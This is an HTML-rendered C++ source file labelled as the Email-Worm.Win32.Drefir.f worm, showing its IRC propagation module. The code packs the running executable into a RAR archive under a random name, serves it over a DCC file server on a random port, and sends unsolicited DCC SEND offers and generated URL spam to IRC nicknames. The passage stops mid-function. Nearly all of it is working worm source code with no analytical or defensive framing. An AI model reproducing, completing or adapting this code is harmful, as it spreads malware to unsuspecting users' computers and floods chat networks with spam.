<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Email-Worm.Win32.Drefir.f - xIrcWorm.cpp.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc2 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc7 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc9">#include "stdafx.h"
#include "xIrcWorm.h"
#include "prototypez.h"
#include "stdlib.h"
#include "stdio.h"
</span><span class="sc0">


</span><span class="sc9">#define DccTimeout  (60*1000) </span><span class="sc2">// 1 minute timeout
</span><span class="sc0">

</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">WINAPI</span><span class="sc0"> </span><span class="sc11">Dcc_Server</span><span class="sc10">(</span><span class="sc11">LPVOID</span><span class="sc0"> </span><span class="sc11">xDccInfo</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">DCC_SERVER_INFO</span><span class="sc0"> </span><span class="sc11">xDccSrvr</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">WSADATA</span><span class="sc0"> </span><span class="sc11">wsd</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">SOCKET</span><span class="sc0"> </span><span class="sc11">sdcc</span><span class="sc10">,</span><span class="sc11">sdcc_out</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">sockaddr_in</span><span class="sc0"> </span><span class="sc11">xsin</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hfile</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">io_buffer</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">fb</span><span class="sc10">[</span><span class="sc4">4096</span><span class="sc10">];</span><span class="sc0">

    </span><span class="sc11">memcpy</span><span class="sc10">(&amp;</span><span class="sc11">xDccSrvr</span><span class="sc10">,</span><span class="sc11">xDccInfo</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">DCC_SERVER_INFO</span><span class="sc10">));</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">WSAStartup</span><span class="sc10">(</span><span class="sc11">MAKEWORD</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">),&amp;</span><span class="sc11">wsd</span><span class="sc10">)==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">sdcc</span><span class="sc10">=</span><span class="sc11">socket</span><span class="sc10">(</span><span class="sc11">AF_INET</span><span class="sc10">,</span><span class="sc11">SOCK_STREAM</span><span class="sc10">,</span><span class="sc11">IPPROTO_TCP</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">sdcc</span><span class="sc10">!=</span><span class="sc11">INVALID_SOCKET</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
        
            </span><span class="sc11">xsin</span><span class="sc10">.</span><span class="sc11">sin_port</span><span class="sc10">=</span><span class="sc11">htons</span><span class="sc10">(</span><span class="sc11">xDccSrvr</span><span class="sc10">.</span><span class="sc11">port</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">xsin</span><span class="sc10">.</span><span class="sc11">sin_family</span><span class="sc10">=</span><span class="sc11">AF_INET</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">xsin</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc10">.</span><span class="sc11">s_addr</span><span class="sc10">=</span><span class="sc11">INADDR_ANY</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">bind</span><span class="sc10">(</span><span class="sc11">sdcc</span><span class="sc10">,(</span><span class="sc11">sockaddr</span><span class="sc0"> </span><span class="sc10">*)&amp;</span><span class="sc11">xsin</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">xsin</span><span class="sc10">))!=</span><span class="sc11">SOCKET_ERROR</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">listen</span><span class="sc10">(</span><span class="sc11">sdcc</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">)!=</span><span class="sc11">SOCKET_ERROR</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">sdcc_out</span><span class="sc10">=</span><span class="sc11">accept</span><span class="sc10">(</span><span class="sc11">sdcc</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
                    
                    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">sdcc_out</span><span class="sc10">!=</span><span class="sc11">INVALID_SOCKET</span><span class="sc10">)</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc11">hfile</span><span class="sc10">=</span><span class="sc11">CreateFile</span><span class="sc10">(</span><span class="sc11">xDccSrvr</span><span class="sc10">.</span><span class="sc11">FileToSend</span><span class="sc10">,</span><span class="sc11">GENERIC_READ</span><span class="sc10">,</span><span class="sc11">FILE_SHARE_READ</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">OPEN_EXISTING</span><span class="sc10">,</span><span class="sc11">FILE_ATTRIBUTE_NORMAL</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">

                        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">hfile</span><span class="sc10">!=</span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0">
                        </span><span class="sc10">{</span><span class="sc0">
                            </span><span class="sc5">do</span><span class="sc0">
                            </span><span class="sc10">{</span><span class="sc0">
                                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">ReadFile</span><span class="sc10">(</span><span class="sc11">hfile</span><span class="sc10">,&amp;</span><span class="sc11">fb</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">fb</span><span class="sc10">),&amp;</span><span class="sc11">io_buffer</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">)==</span><span class="sc11">TRUE</span><span class="sc10">)</span><span class="sc0">
                                    </span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">sdcc_out</span><span class="sc10">,</span><span class="sc11">fb</span><span class="sc10">,</span><span class="sc11">io_buffer</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
                            </span><span class="sc10">}</span><span class="sc0">
                            </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">io_buffer</span><span class="sc10">&gt;</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

                            </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hfile</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc10">}</span><span class="sc0">

                        </span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc4">5000</span><span class="sc10">);</span><span class="sc0">    </span><span class="sc2">//wait before closing the socket !
</span><span class="sc0">
                        </span><span class="sc11">closesocket</span><span class="sc10">(</span><span class="sc11">sdcc_out</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc11">closesocket</span><span class="sc10">(</span><span class="sc11">sdcc</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">   
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">WINAPI</span><span class="sc0"> </span><span class="sc11">SendDccRequest</span><span class="sc10">(</span><span class="sc11">LPVOID</span><span class="sc0"> </span><span class="sc11">xDccInfo</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">DCCInfo</span><span class="sc0"> </span><span class="sc11">xDcc_Info</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">xIrcBuffer</span><span class="sc10">[</span><span class="sc4">140</span><span class="sc10">],</span><span class="sc11">userip</span><span class="sc10">[</span><span class="sc4">25</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">SOCKADDR</span><span class="sc0"> </span><span class="sc11">xsockaddr</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">SizeOfxsa</span><span class="sc10">=</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">xsockaddr</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">dccport</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">filesize</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">FileSending</span><span class="sc10">=</span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">DCC_SERVER_INFO</span><span class="sc0"> </span><span class="sc11">DccServer_Info</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">filename</span><span class="sc10">[</span><span class="sc4">30</span><span class="sc10">],</span><span class="sc11">tempbuf</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">xtmprar</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">],</span><span class="sc11">packedfile</span><span class="sc10">[</span><span class="sc4">40</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc11">wfd</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hdccsrvr</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">memcpy</span><span class="sc10">(&amp;</span><span class="sc11">xDcc_Info</span><span class="sc10">,</span><span class="sc11">xDccInfo</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">DCCInfo</span><span class="sc10">));</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">xDcc_Info</span><span class="sc10">.</span><span class="sc11">OveRideIp</span><span class="sc10">==</span><span class="sc11">TRUE</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">lstrcpy</span><span class="sc10">(</span><span class="sc11">userip</span><span class="sc10">,</span><span class="sc11">xDcc_Info</span><span class="sc10">.</span><span class="sc11">Oip</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">else</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">getsockname</span><span class="sc10">(</span><span class="sc11">xDcc_Info</span><span class="sc10">.</span><span class="sc11">xsocket</span><span class="sc10">,&amp;</span><span class="sc11">xsockaddr</span><span class="sc10">,&amp;</span><span class="sc11">SizeOfxsa</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc11">wsprintf</span><span class="sc10">(</span><span class="sc11">userip</span><span class="sc10">,</span><span class="sc6">"%d.%d.%d.%d"</span><span class="sc10">,(</span><span class="sc11">BYTE</span><span class="sc10">)</span><span class="sc11">xsockaddr</span><span class="sc10">.</span><span class="sc11">sa_data</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">],</span><span class="sc0">
            </span><span class="sc10">(</span><span class="sc11">BYTE</span><span class="sc10">)</span><span class="sc11">xsockaddr</span><span class="sc10">.</span><span class="sc11">sa_data</span><span class="sc10">[</span><span class="sc4">3</span><span class="sc10">],(</span><span class="sc11">BYTE</span><span class="sc10">)</span><span class="sc11">xsockaddr</span><span class="sc10">.</span><span class="sc11">sa_data</span><span class="sc10">[</span><span class="sc4">4</span><span class="sc10">],</span><span class="sc0">
            </span><span class="sc10">(</span><span class="sc11">BYTE</span><span class="sc10">)</span><span class="sc11">xsockaddr</span><span class="sc10">.</span><span class="sc11">sa_data</span><span class="sc10">[</span><span class="sc4">5</span><span class="sc10">]);</span><span class="sc0">    </span><span class="sc2">//get user ip string
</span><span class="sc0">    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc11">srand</span><span class="sc10">(</span><span class="sc11">GetTickCount</span><span class="sc10">());</span><span class="sc0">      </span><span class="sc2">//randomize !
</span><span class="sc0">
    </span><span class="sc11">dccport</span><span class="sc10">=(</span><span class="sc4">1000</span><span class="sc10">+(</span><span class="sc11">rand</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">200</span><span class="sc10">));</span><span class="sc0">  </span><span class="sc2">//random port between 1000 ~ 1200
</span><span class="sc0">
    </span><span class="sc11">GetDccFileName</span><span class="sc10">(</span><span class="sc11">filename</span><span class="sc10">);</span><span class="sc0">       </span><span class="sc2">//get a file name
</span><span class="sc0">
    </span><span class="sc11">GetTempPath</span><span class="sc10">(</span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc11">tempbuf</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc11">wsprintf</span><span class="sc10">(</span><span class="sc11">xtmprar</span><span class="sc10">,</span><span class="sc6">"%s%x%x%x%x.tmp"</span><span class="sc10">,</span><span class="sc11">tempbuf</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc10">(</span><span class="sc11">rand</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">50</span><span class="sc10">),(</span><span class="sc11">rand</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">50</span><span class="sc10">),(</span><span class="sc11">rand</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">50</span><span class="sc10">),(</span><span class="sc11">rand</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">50</span><span class="sc10">));</span><span class="sc0">

    </span><span class="sc11">GetModuleFileName</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">tempbuf</span><span class="sc10">,</span><span class="sc11">MAX_PATH</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">lstrcpy</span><span class="sc10">(</span><span class="sc11">packedfile</span><span class="sc10">,</span><span class="sc11">filename</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">lstrcat</span><span class="sc10">(</span><span class="sc11">packedfile</span><span class="sc10">,</span><span class="sc6">".exe"</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">AddToRar</span><span class="sc10">(</span><span class="sc11">xtmprar</span><span class="sc10">,</span><span class="sc11">tempbuf</span><span class="sc10">,</span><span class="sc11">packedfile</span><span class="sc10">,</span><span class="sc11">FILE_ATTRIBUTE_NORMAL</span><span class="sc10">)==</span><span class="sc11">TRUE</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">

        </span><span class="sc11">FindClose</span><span class="sc10">(</span><span class="sc11">FindFirstFile</span><span class="sc10">(</span><span class="sc11">xtmprar</span><span class="sc10">,&amp;</span><span class="sc11">wfd</span><span class="sc10">));</span><span class="sc0"> </span><span class="sc2">//use FindFirstFile to get the file size
</span><span class="sc0">
        </span><span class="sc11">filesize</span><span class="sc10">=</span><span class="sc11">wfd</span><span class="sc10">.</span><span class="sc11">nFileSizeLow</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc11">lstrcpy</span><span class="sc10">(</span><span class="sc11">DccServer_Info</span><span class="sc10">.</span><span class="sc11">FileToSend</span><span class="sc10">,</span><span class="sc11">xtmprar</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc2">//setup file name
</span><span class="sc0">        </span><span class="sc11">DccServer_Info</span><span class="sc10">.</span><span class="sc11">port</span><span class="sc10">=</span><span class="sc11">dccport</span><span class="sc10">;</span><span class="sc0">    </span><span class="sc2">//setup port
</span><span class="sc0">        </span><span class="sc11">DccServer_Info</span><span class="sc10">.</span><span class="sc11">FileSending</span><span class="sc10">=&amp;</span><span class="sc11">FileSending</span><span class="sc10">;</span><span class="sc0">    </span><span class="sc2">//setup pointer to status
</span><span class="sc0">
        </span><span class="sc11">hdccsrvr</span><span class="sc10">=</span><span class="sc11">XThread</span><span class="sc10">(</span><span class="sc11">Dcc_Server</span><span class="sc10">,&amp;</span><span class="sc11">DccServer_Info</span><span class="sc10">);</span><span class="sc0">   </span><span class="sc2">//start a dcc server
</span><span class="sc0">
        </span><span class="sc11">wsprintf</span><span class="sc10">(</span><span class="sc11">xIrcBuffer</span><span class="sc10">,</span><span class="sc6">"NOTICE %s :DCC send %s.rar (%s)\r\n"</span><span class="sc10">,</span><span class="sc0">
            </span><span class="sc11">xDcc_Info</span><span class="sc10">.</span><span class="sc11">xNick</span><span class="sc10">,</span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc11">userip</span><span class="sc10">);</span><span class="sc0">       </span><span class="sc2">//dcc notice
</span><span class="sc0">    
        </span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">xDcc_Info</span><span class="sc10">.</span><span class="sc11">xsocket</span><span class="sc10">,</span><span class="sc11">xIrcBuffer</span><span class="sc10">,</span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">xIrcBuffer</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    
        </span><span class="sc11">wsprintf</span><span class="sc10">(</span><span class="sc11">xIrcBuffer</span><span class="sc10">,</span><span class="sc0">
            </span><span class="sc6">"PRIVMSG %s :%cDCC SEND %s.rar %d %d %d%c\r\n"</span><span class="sc10">,</span><span class="sc0">
            </span><span class="sc11">xDcc_Info</span><span class="sc10">.</span><span class="sc11">xNick</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc11">htonl</span><span class="sc10">(</span><span class="sc11">inet_addr</span><span class="sc10">(</span><span class="sc11">userip</span><span class="sc10">)),</span><span class="sc0">
            </span><span class="sc11">dccport</span><span class="sc10">,</span><span class="sc11">filesize</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc2">//send dcc request
</span><span class="sc0">    
        </span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">xDcc_Info</span><span class="sc10">.</span><span class="sc11">xsocket</span><span class="sc10">,</span><span class="sc11">xIrcBuffer</span><span class="sc10">,</span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">xIrcBuffer</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc11">WaitForSingleObject</span><span class="sc10">(</span><span class="sc11">hdccsrvr</span><span class="sc10">,</span><span class="sc11">DccTimeout</span><span class="sc10">);</span><span class="sc0">       </span><span class="sc2">//wait for the server to finish
</span><span class="sc0">
        </span><span class="sc11">TerminateThread</span><span class="sc10">(</span><span class="sc11">hdccsrvr</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hdccsrvr</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc11">DeleteFile</span><span class="sc10">(</span><span class="sc11">xtmprar</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">WINAPI</span><span class="sc0"> </span><span class="sc11">SendSpamUrl</span><span class="sc10">(</span><span class="sc11">LPVOID</span><span class="sc0"> </span><span class="sc11">xSpamInfo</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">SpamInfo</span><span class="sc0"> </span><span class="sc11">xSiNFO</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">SOCKADDR</span><span class="sc0"> </span><span class="sc11">xsockaddr</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">SizeOfxsa</span><span class="sc10">=</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">xsockaddr</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">userip</span><span class="sc10">[</span><span class="sc4">21</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">msg</span><span class="sc10">[</span><span class="sc4">200</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">xIrcBuffer</span><span class="sc10">[</span><span class="sc4">256</span><span class="sc10">];</span><span class="sc0">

    </span><span class="sc11">memcpy</span><span class="sc10">(&amp;</span><span class="sc11">xSiNFO</span><span class="sc10">,</span><span class="sc11">xSpamInfo</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">SpamInfo</span><span class="sc10">));</span><span class="sc0">

    </span><span class="sc11">srand</span><span class="sc10">(</span><span class="sc11">GetTickCount</span><span class="sc10">());</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">xSiNFO</span><span class="sc10">.</span><span class="sc11">OveRideIp</span><span class="sc10">==</span><span class="sc11">TRUE</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">lstrcpy</span><span class="sc10">(</span><span class="sc11">userip</span><span class="sc10">,</span><span class="sc11">xSiNFO</span><span class="sc10">.</span><span class="sc11">Oip</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">else</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">getsockname</span><span class="sc10">(</span><span class="sc11">xSiNFO</span><span class="sc10">.</span><span class="sc11">xsocket</span><span class="sc10">,&amp;</span><span class="sc11">xsockaddr</span><span class="sc10">,&amp;</span><span class="sc11">SizeOfxsa</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc11">wsprintf</span><span class="sc10">(</span><span class="sc11">userip</span><span class="sc10">,</span><span class="sc6">"%d.%d.%d.%d"</span><span class="sc10">,(</span><span class="sc11">BYTE</span><span class="sc10">)</span><span class="sc11">xsockaddr</span><span class="sc10">.</span><span class="sc11">sa_data</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">],</span><span class="sc0">
            </span><span class="sc10">(</span><span class="sc11">BYTE</span><span class="sc10">)</span><span class="sc11">xsockaddr</span><span class="sc10">.</span><span class="sc11">sa_data</span><span class="sc10">[</span><span class="sc4">3</span><span class="sc10">],(</span><span class="sc11">BYTE</span><span class="sc10">)</span><span class="sc11">xsockaddr</span><span class="sc10">.</span><span class="sc11">sa_data</span><span class="sc10">[</span><span class="sc4">4</span><span class="sc10">],</span><span class="sc0">
            </span><span class="sc10">(</span><span class="sc11">BYTE</span><span class="sc10">)</span><span class="sc11">xsockaddr</span><span class="sc10">.</span><span class="sc11">sa_data</span><span class="sc10">[</span><span class="sc4">5</span><span class="sc10">]);</span><span class="sc0">    </span><span class="sc2">//get user ip string
</span><span class="sc0">    
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc11">GenUrlSpamMessage</span><span class="sc10">(</span><span class="sc11">msg</span><span class="sc10">,</span><span class="sc11">userip</span><span class="sc10">);</span><span class="sc0">      </span><span class="sc2">//generate spam message
</span><span class="sc0">
    </span><span class="sc11">wsprintf</span><span class="sc10">(</span><span class="sc11">xIrcBuffer</span><span class="sc10">,</span><span class="sc6">"PRIVMSG %s :%s\r\n"</span><span class="sc10">,</span><span class="sc11">xSiNFO</span><span class="sc10">.</span><span class="sc11">nick2spam</span><span class="sc10">,</span><span class="sc11">msg</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">xSiNFO</span><span class="sc10">.</span><span class="sc11">AutoSpam</span><span class="sc10">==</span><span class="sc11">FALSE</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc11">Sleep</span><span class="sc10">((</span><span class="sc11">rand</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">10</span><span class="sc10">)*</span><span class="sc4">1000</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">xSiNFO</span><span class="sc10">.</span><span class="sc11">xsocket</span><span class="sc10">,</span><span class="sc11">xIrcBuffer</span><span class="sc10">,</span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">xIrcBuffer</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">xIrcWorm</span><span class="sc10">::</span><span class="sc11">InitWorm</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">IrcServer</span><span class="sc10">[],</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">port</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">lstrcpy</span><span class="sc10">(</span><span class="sc11">Irc_Server</span><span class="sc10">,</span><span class="sc11">IrcServer</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">Irc_Port</span><span class="sc10">=</span><span class="sc11">port</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">number_of_channels</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">OverRideIP</span><span class="sc10">=</span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">xIrcWorm</span><span class="sc10">::</span><span class="sc11">myrecv</span><span class="sc10">(</span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">GetLine</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">retval</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">recvied</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">];</span><span class="sc0">

    </span><span class="sc11">memset</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">));</span><span class="sc0">                    </span><span class="sc2">//zero buffer
</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">GetLine</span><span class="sc10">==</span><span class="sc11">FALSE</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc10">(</span><span class="sc11">recv</span><span class="sc10">(</span><span class="sc11">Irc_Socket</span><span class="sc10">,</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">));</span><span class="sc0">
    
    </span><span class="sc5">do</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        
        </span><span class="sc11">retval</span><span class="sc10">=</span><span class="sc11">recv</span><span class="sc10">(</span><span class="sc11">Irc_Socket</span><span class="sc10">,(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">recvied</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
        
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">retval</span><span class="sc10">==</span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">retval</span><span class="sc10">==</span><span class="sc11">INVALID_SOCKET</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">

